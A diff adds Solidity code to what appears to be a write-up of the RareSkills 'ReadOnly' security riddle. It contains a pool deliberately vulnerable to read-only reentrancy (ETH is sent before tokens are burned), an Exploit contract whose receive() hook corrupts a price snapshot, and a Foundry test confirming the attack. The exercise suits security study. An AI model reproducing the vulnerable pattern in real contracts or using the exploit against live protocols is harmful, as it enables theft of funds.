@@ -1140,9 +1140,110 @@ Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/ReadOnl
 ### Contracts
 - `src/Week10-11/ReadOnly.sol`
 ```
+contract VulnerableDeFiContract {
+    ReadOnlyPool private pool;
+    uint256 public lpTokenPrice;
+
+    constructor(ReadOnlyPool _pool) {
+        pool = _pool;
+    }
+
+    // @notice since getVirtualPrice is always correct, anyone can call it
+    function snapshotPrice() external {
+        lpTokenPrice = pool.getVirtualPrice();
+    }
+}
+
+contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
+    //IERC20[] public acceptedTokens;
+    mapping(address => bool) acceptedTokens;
+    mapping(address => uint256) originalStake;
+
+    // @notice deposit eth and get back the same amount of LPTokens for later redemption
+    function addLiquidity() external payable nonReentrant {
+        originalStake[msg.sender] += msg.value;
+        _mint(msg.sender, msg.value);
+    }
+
+    // @notice burn LPTokens and get back the original deposit of ETH + profits
+    function removeLiquidity() external nonReentrant {
+        uint256 numLPTokens = balanceOf(msg.sender);
+        uint256 totalLPTokens = totalSupply();
+        uint256 ethToReturn = (originalStake[msg.sender] * (numLPTokens + totalLPTokens)) / totalLPTokens;
+
+        originalStake[msg.sender] = 0;
+        (bool ok,) = msg.sender.call{value: ethToReturn}("");
+        require(ok, "eth transfer failed");
+
+        _burn(msg.sender, numLPTokens);
+    }
+
+    /*
+     * @notice virtualPrice is the ETH in the contract divided by the total LP tokens.
+     *         As more tokens are earned by the pool, the liquidity tokens are worth
+     *         more because they can redeem the same size of a larger pool.
+     * @dev there is always at least as much
+     */
+
+    function getVirtualPrice() external view returns (uint256 virtualPrice) {
+        virtualPrice = address(this).balance / totalSupply();
+    }
+
+    // @notice earn profits for the pool
+    function earnProfit() external payable {}
+}
+
+contract Exploit {
+    ReadOnlyPool public readOnlyPool;
+    VulnerableDeFiContract public vulnerableDeFiContract;
+
+    constructor(ReadOnlyPool _readOnlyPool, VulnerableDeFiContract _vulnerableDeFiContract) {
+        readOnlyPool = _readOnlyPool;
+        vulnerableDeFiContract = _vulnerableDeFiContract;
+    }
+
+    function exploit() public payable {
+        readOnlyPool.addLiquidity{value: msg.value}();
+        readOnlyPool.removeLiquidity();
+    }
+
+    receive() external payable {
+        vulnerableDeFiContract.snapshotPrice();
+    }
+}
 ```
 - `src/Week10-11/ReadOnly.t.sol`
 ```
+contract ReadOnlyTest is Test {
+    address attackerWallet;
+    VulnerableDeFiContract vulnerableDeFiContract;
+    ReadOnlyPool readOnlyPoolContract;
+    Exploit exploitContract;
+
+    function setUp() public {
+        attackerWallet = address(0xbadbad);
+        readOnlyPoolContract = new ReadOnlyPool();
+        vulnerableDeFiContract = new VulnerableDeFiContract(readOnlyPoolContract);
+        exploitContract = new Exploit(readOnlyPoolContract, vulnerableDeFiContract);
+
+        readOnlyPoolContract.addLiquidity{value: 100 ether}();
+        readOnlyPoolContract.earnProfit{value: 1 ether}();
+        vulnerableDeFiContract.snapshotPrice();
+
+        //Player starts with 2 ETH
+        vm.deal(attackerWallet, 2 ether);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attackerWallet);
+        exploitContract.exploit{value: 2 ether}();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(vulnerableDeFiContract.lpTokenPrice(), 0);
+    }
+}
 ```
 
 ### Exploit
